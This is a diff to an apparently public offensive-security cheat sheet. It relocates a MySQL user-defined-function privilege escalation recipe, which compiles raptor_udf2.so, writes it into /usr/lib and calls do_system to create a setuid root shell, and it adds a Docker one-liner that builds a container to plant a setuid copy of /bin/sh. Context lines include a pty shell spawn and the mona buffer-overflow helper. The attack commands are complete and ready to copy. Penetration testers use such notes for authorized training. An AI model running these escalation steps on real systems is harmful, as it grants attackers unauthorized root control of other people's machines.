@@ -309,22 +309,6 @@ python -c 'import pty; pty.spawn("/bin/sh")'
 # We're interested in modules without protection, Read & Execute permissions
 !mona modules
 ```
-##### MySQL User Defined Fuction Privilge Escalation
-Requires [raptor_udf2.c](https://github.com/mantvydasb/Offensive-Security-Cheatsheets/blob/master/raptor_udf2.c) and [sid-shell.c](https://github.com/mantvydasb/Offensive-Security-Cheatsheets/blob/master/sid-shell.c) or
- [full tarball](https://github.com/mantvydasb/Offensive-Security-Cheatsheets/blob/master/raptor/raptor.tar)
-
-```
-gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
-```
-
-```mysql
-use mysql;
-create table npn(line blob);
-insert into npn values(load_file('/tmp/raptor_udf2.so'));
-select * from npn into dumpfile '/usr/lib/raptor_udf2.so';
-create function do_system returns integer soname 'raptor_udf2.so';
-select do_system('chown root:root /tmp/sid-shell; chmod +s /tmp/sid-shell');
-```
 
 ##### Finding JMP ESP Address
 ```
@@ -345,6 +329,28 @@ ruby -r webrick -e "WEBrick::HTTPServer.new(:Port => 80, :DocumentRoot => Dir.pw
 php -S 0.0.0.0:80
 ```
 
+#### MySQL User Defined Fuction Privilge Escalation
+Requires [raptor_udf2.c](https://github.com/mantvydasb/Offensive-Security-Cheatsheets/blob/master/raptor_udf2.c) and [sid-shell.c](https://github.com/mantvydasb/Offensive-Security-Cheatsheets/blob/master/sid-shell.c) or
+ [full tarball](https://github.com/mantvydasb/Offensive-Security-Cheatsheets/blob/master/raptor/raptor.tar)
+
+```
+gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+```
+
+```mysql
+use mysql;
+create table npn(line blob);
+insert into npn values(load_file('/tmp/raptor_udf2.so'));
+select * from npn into dumpfile '/usr/lib/raptor_udf2.so';
+create function do_system returns integer soname 'raptor_udf2.so';
+select do_system('chown root:root /tmp/sid-shell; chmod +s /tmp/sid-shell');
+```
+
+#### Docker Privilege Esclation
+```bash
+echo -e "FROM ubuntu:14.04\nENV WORKDIR /stuff\nRUN mkdir -p /stuff\nVOLUME [ /stuff ]\nWORKDIR /stuff" > Dockerfile && docker build -t my-docker-image . && docker run -v $PWD:/stuff -t my-docker-image /bin/sh -c 'cp /bin/sh /stuff && chown root.root /stuff/sh && chmod a+s /stuff/sh' && ./sh -c id && ./sh
+
+```
 
 #### Uploading Files to Target Machine
 
